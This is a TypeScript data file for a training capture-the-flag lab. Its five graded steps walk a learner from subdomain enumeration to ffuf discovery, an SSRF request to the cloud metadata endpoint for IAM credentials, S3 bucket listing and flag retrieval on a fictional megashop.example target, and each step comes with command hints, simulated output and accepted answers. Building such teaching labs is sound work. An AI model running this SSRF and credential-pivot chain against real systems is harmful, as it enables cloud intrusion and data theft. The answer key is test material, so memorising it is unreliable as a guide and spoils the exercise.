/**
 * Final chained CTF — "Bounty Capstone".
 * The learner solves a 5-step chain starting from a single subdomain and
 * ending at a critical bounty flag. Grading happens by task answers inside
 * the lab, not by rules.
 */

export interface CapstoneStep {
  id: string;
  title: string;
  prompt: string;
  commandHint: string;
  response: string;
  answers: string[];
}

export const CAPSTONE_FLAG = "FLAG{bounty_hunter_graduated_full_chain}";

export const CAPSTONE_STEPS: CapstoneStep[] = [
  {
    id: "recon",
    title: "Step 1 · Recon",
    prompt:
      "Target: *.megashop.example (new program on HackerOne, scope just dropped). Enumerate subdomains and find the one that looks LEAST maintained.",
    commandHint: "subfinder -d megashop.example",
    response:
      "www.megashop.example\napi.megashop.example\nmobile.megashop.example\nadmin.megashop.example\nlegacy-reports.megashop.example   [Apache 2.2 / PHP 5.4]\nstaging.megashop.example\n",
    answers: ["legacy-reports.megashop.example", "legacy-reports"],
  },
  {
    id: "surface",
    title: "Step 2 · Content discovery",
    prompt:
      "On legacy-reports.megashop.example, run ffuf. Which hidden endpoint accepts a URL parameter — the classic SSRF candidate?",
    commandHint:
      "ffuf -u https://legacy-reports.megashop.example/FUZZ -w common.txt -mc 200,403",
    response:
      "report       [200]\nexport       [200]\ndownload     [200]  (?url=…)\nold-login    [403]\n.git/HEAD    [200]",
    answers: ["/download", "download", "/download?url=", "download?url"],
  },
  {
    id: "ssrf",
    title: "Step 3 · SSRF to IMDS",
    prompt:
      "The /download?url= endpoint fetches the URL server-side. Reach IMDS. What IAM role is attached to this box?",
    commandHint:
      "curl 'https://legacy-reports.megashop.example/download?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
    response: "legacy-reports-s3-role",
    answers: ["legacy-reports-s3-role"],
  },
  {
    id: "pivot",
    title: "Step 4 · Cloud pivot",
    prompt:
      "Export the credentials and list S3 buckets you can read. Which bucket name screams 'should not be world-readable'?",
    commandHint: "aws s3 ls",
    response:
      "2026-03-02 00:00:00 megashop-public-assets\n2026-03-02 00:00:00 megashop-marketing-cdn\n2026-03-02 00:00:00 megashop-prod-db-backups",
    answers: ["megashop-prod-db-backups", "prod-db-backups"],
  },
  {
    id: "impact",
    title: "Step 5 · Prove impact (minimum necessary)",
    prompt:
      "Inside the bucket, there is a single file named ctf.txt. Read it, retrieve the flag, write the report. (Do NOT download the real database backups — in a real bounty that would be unauthorised data access.)",
    commandHint: "aws s3 cp s3://megashop-prod-db-backups/ctf.txt -",
    response: CAPSTONE_FLAG,
    answers: [CAPSTONE_FLAG, "bounty_hunter_graduated_full_chain"],
  },
];
